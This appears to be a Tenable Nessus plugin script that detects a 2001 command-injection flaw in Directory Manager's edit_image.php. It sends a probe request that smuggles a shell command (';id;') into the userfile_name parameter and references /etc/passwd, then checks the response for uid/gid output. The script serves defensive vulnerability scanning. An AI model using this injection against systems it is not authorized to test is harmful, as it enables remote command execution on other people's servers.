#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(11104);
 script_bugtraq_id(3288);
 script_version ("$Revision: 1.14 $");
 script_cve_id("CVE-2001-1020");
 script_xref(name:"OSVDB", value:"1948");
 
 script_name(english:"Directory Manager edit_image.php Arbitrary Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"The web application running on the remote host has a command
execution vulnerability." );
 script_set_attribute(attribute:"description", value:
"Directory Manager is installed and does not properly filter user input.
A remote attacker may use this flaw to execute arbitrary commands." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2001-09/0013.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade your software or firewall your web server." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
 summary["english"] = "Detects edit_image.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)) exit(0);


http_check_remote_code (
			check_request:"/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;id;%20",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			port:port
			);
